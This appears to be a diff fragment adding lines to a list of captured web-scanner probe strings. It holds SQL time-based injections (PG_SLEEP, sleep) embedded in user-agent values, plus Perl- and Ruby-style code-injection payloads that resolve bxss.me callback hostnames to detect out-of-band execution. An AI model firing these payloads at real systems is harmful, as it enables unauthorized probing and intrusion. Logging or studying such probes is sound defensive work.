@@ -2783,3 +2783,6 @@ geth(ostbyname(lc('hitfs'.'bgbytugi86759.bxss.me.')).'A'.chr(67).chr(hex('58')).
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36""||sleep(27*1000)*diycem||"")
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36wBltn9iv' OR 665=(SELECT 665 FROM PG_SLEEP(15))--)
 "".gethostbyname(lc(""hithp"".""xhrnixlh1b3fc.bxss.me."").""A"".chr(67).chr(hex(""58"")).chr(113).chr(74).chr(109).chr(81)."")
+'A'.concat(70-3.concat(22*4).concat(103).concat(75).concat(113).concat(79)+(require'socket' Socket.gethostbyname('hitmo'+'vydybfxx1fb8f.bxss.me.')[3].to_s))
+'+'A'.concat(70-3.concat(22*4).concat(109).concat(65).concat(118).concat(79)+(require'socket' Socket.gethostbyname('hitus'+'xidjkexd2aac6.bxss.me.')[3].to_s)+')
+""+""A"".concat(70-3.concat(22*4).concat(118).concat(90).concat(103).concat(83)+(require""socket"" Socket.gethostbyname(""hitsk""+""fqafaxrbb00f8.bxss.me."")[3].to_s)+"")
